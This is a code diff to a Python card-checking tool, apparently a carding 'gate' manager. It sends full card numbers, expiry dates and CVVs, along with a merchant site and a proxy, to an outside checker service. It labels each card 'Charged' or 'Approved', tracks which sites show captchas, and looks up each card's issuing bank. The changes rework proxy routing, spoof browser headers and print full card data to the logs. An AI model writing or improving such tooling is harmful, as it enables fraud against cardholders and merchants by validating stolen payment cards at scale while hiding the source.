@@ -1,6 +1,5 @@
 import asyncio
 import aiohttp
-import aiohttp_socks
 import time
 import json
 import random
@@ -147,54 +146,67 @@ class Gate4Manager:
                 return {"success": False, "message": "Invalid card number", "elapsed_time": time.time() - start_time}
             
             bin_num = cc_clean[:6]
+            url = f'https://bins.antipublic.cc/bins/{bin_num}'
             
-            connector = None
-            if proxy:
-                try:
-                    if '://' in proxy:
-                        proxy = proxy.split('://')[-1]
-                    
-                    if ':' in proxy:
-                        parts = proxy.split(':')
-                        if len(parts) == 2:
-                            host, port = parts[0], int(parts[1])
-                            connector = aiohttp_socks.ProxyConnector.from_url(f'socks5://{host}:{port}')
-                        elif len(parts) == 4:
-                            username, password, host, port = parts
-                            connector = aiohttp_socks.ProxyConnector.from_url(f'socks5://{username}:{password}@{host}:{port}')
-                        else:
-                            host_port_match = re.search(r'(\d+\.\d+\.\d+\.\d+):(\d+)', proxy)
-                            if host_port_match:
-                                host, port = host_port_match.groups()
-                                connector = aiohttp_socks.ProxyConnector.from_url(f'socks5://{host}:{port}')
-                except:
-                    pass
+            # Prepare headers
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+                'Accept': 'application/json',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Referer': 'https://bins.antipublic.cc/',
+                'Origin': 'https://bins.antipublic.cc'
+            }
             
-            # First try with proxy if available
-            if connector:
-                async with aiohttp.ClientSession(connector=connector) as session:
-                    async with session.get(f'https://bins.antipublic.cc/bins/{bin_num}', timeout=15) as response:
+            # Try without proxy first
+            try:
+                async with aiohttp.ClientSession(headers=headers) as session:
+                    async with session.get(url, timeout=10) as response:
                         if response.status == 200:
                             data = await response.json()
                             return self._process_bin_data(data, start_time)
-                        # If proxy fails, try without proxy
-                        
-            # Try without proxy
-            async with aiohttp.ClientSession() as session:
-                async with session.get(f'https://bins.antipublic.cc/bins/{bin_num}', timeout=15) as response:
-                    if response.status != 200:
-                        return {"success": False, "message": f"BIN Lookup failed with status {response.status}", "elapsed_time": time.time() - start_time}
+                        else:
+                            print(f"Direct BIN lookup failed with status: {response.status}")
+            except Exception as e:
+                print(f"Direct BIN lookup error: {str(e)}")
+            
+            # Try with HTTP proxy if provided
+            if proxy:
+                try:
+                    # Clean proxy string
+                    proxy_url = proxy
+                    if not proxy_url.startswith(('http://', 'https://')):
+                        proxy_url = f"http://{proxy_url}"
                     
-                    data = await response.json()
-                    return self._process_bin_data(data, start_time)
+                    print(f"Trying BIN lookup with proxy: {proxy_url}")
                     
-        except asyncio.TimeoutError:
-            return {"success": False, "message": "BIN Lookup timed out", "elapsed_time": time.time() - start_time}
+                    async with aiohttp.ClientSession(headers=headers) as session:
+                        async with session.get(url, proxy=proxy_url, timeout=10) as response:
+                            if response.status == 200:
+                                data = await response.json()
+                                return self._process_bin_data(data, start_time)
+                            else:
+                                print(f"Proxy BIN lookup failed with status: {response.status}")
+                except Exception as e:
+                    print(f"Proxy BIN lookup error: {str(e)}")
+            
+            return {"success": False, "message": "BIN Lookup failed", "elapsed_time": time.time() - start_time}
+                    
         except Exception as e:
+            print(f"BIN lookup exception: {str(e)}")
             return {"success": False, "message": f"BIN Lookup error: {str(e)}", "elapsed_time": time.time() - start_time}
     
     def _process_bin_data(self, data: Dict, start_time: float) -> Dict[str, Any]:
-        """Process BIN data response"""
+        """Process BIN data response based on the actual API response format"""
+        # Debug: Print the raw data for troubleshooting
+        print(f"BIN API Response: {data}")
+        
+        # Get country currencies safely
+        currencies = data.get('country_currencies', ['USD'])
+        if isinstance(currencies, list) and currencies:
+            currency = currencies[0]
+        else:
+            currency = "USD"
+        
         return {
             "success": True,
             "bin": data.get('bin', ''),
@@ -204,7 +216,7 @@ class Gate4Manager:
             "level": data.get('level', 'Unknown'),
             "country": data.get('country_name', 'Unknown'),
             "flag": data.get('country_flag', '🏳️'),
-            "currency": data.get('country_currencies', ['USD'])[0] if data.get('country_currencies') else "USD",
+            "currency": currency,
             "elapsed_time": time.time() - start_time
         }
     
@@ -273,14 +285,25 @@ class Gate4Manager:
             
             card = card.strip()
             
+            # Prepare the API URL
             if proxy:
-                api_url = f"https://notconfirm.com/index.php?site={site}&cc={card}&proxy={proxy}"
+                # Clean proxy for the API call
+                clean_proxy = proxy
+                if clean_proxy.startswith('http://'):
+                    clean_proxy = clean_proxy.replace('http://', '')
+                elif clean_proxy.startswith('https://'):
+                    clean_proxy = clean_proxy.replace('https://', '')
+                
+                api_url = f"https://notconfirm.com/index.php?site={site}&cc={card}&proxy={clean_proxy}"
             else:
                 api_url = f"https://notconfirm.com/index.php?site={site}&cc={card}"
+            
+            print(f"Checking card with URL: {api_url}")
             
             session = await self.get_session()
             async with session.get(api_url, timeout=30) as response:
                 response_text = await response.text()
+                print(f"API Response status: {response.status}, text: {response_text[:200]}")
                 
                 if response.status != 200:
                     return Gate4Result(
@@ -313,7 +336,8 @@ class Gate4Manager:
                             message="HCAPTCHA DETECTED"
                         )
                     
-                    if any(keyword in response_msg for keyword in ["Thank", "Thank You"]):
+                    # Determine status
+                    if any(keyword in response_msg for keyword in ["Thank", "Thank You", "SUCCESSFUL"]):
                         status = "Charged"
                     elif "ACTIONREQUIRED" in response_msg or "ActionRequired" in response_msg or "APPROVED" in response_msg:
                         status = "Approved"
@@ -335,6 +359,7 @@ class Gate4Manager:
                     else:
                         card_info = card
                     
+                    # Create result with default values
                     result = Gate4Result(
                         status=status,
                         response=data.get("Response", "Unknown"),
@@ -349,12 +374,19 @@ class Gate4Manager:
                         elapsed_time=time.time() - start_time,
                         proxy_status=self.format_proxy_display(proxy) if proxy else "No Proxy",
                         site_used=site,
-                        message=data.get("Response", "")
+                        message=data.get("Response", ""),
+                        bank="Unknown",
+                        brand="Unknown",
+                        type="Unknown",
+                        level="Unknown"
                     )
                     
                     # Perform BIN lookup if not in test mode
                     if not test_mode:
+                        print(f"Performing BIN lookup for card: {card}")
                         bin_data = await self.perform_bin_lookup(card, proxy)
+                        print(f"BIN lookup result: {bin_data}")
+                        
                         if bin_data.get("success"):
                             result.bank = bin_data.get("bank", "Unknown")
                             result.brand = bin_data.get("brand", "Unknown")
@@ -366,7 +398,9 @@ class Gate4Manager:
                     
                     return result
                     
-                except json.JSONDecodeError:
+                except json.JSONDecodeError as e:
+                    print(f"JSON decode error: {str(e)}")
+                    # Handle non-JSON response
                     response_upper = response_text.upper()
                     if "HCAPTCHA" in response_upper or "CAPTCHA" in response_upper:
                         self.captcha_sites[site] = time.time()
@@ -414,6 +448,7 @@ class Gate4Manager:
                 message="Request timeout"
             )
         except Exception as e:
+            print(f"Check card exception: {str(e)}")
             return Gate4Result(
                 status="Error",
                 response="Exception",
@@ -516,6 +551,13 @@ class Gate4Manager:
             
         except:
             return 0, 0
+    
+    async def test_bin_lookup(self, bin_number: str):
+        """Test BIN lookup directly"""
+        test_card = f"{bin_number}0000000000|01|29|123"
+        result = await self.perform_bin_lookup(test_card)
+        print(f"Test BIN Lookup for {bin_number}: {result}")
+        return result
 
 # Global gate4 manager
 gate4_manager = Gate4Manager()
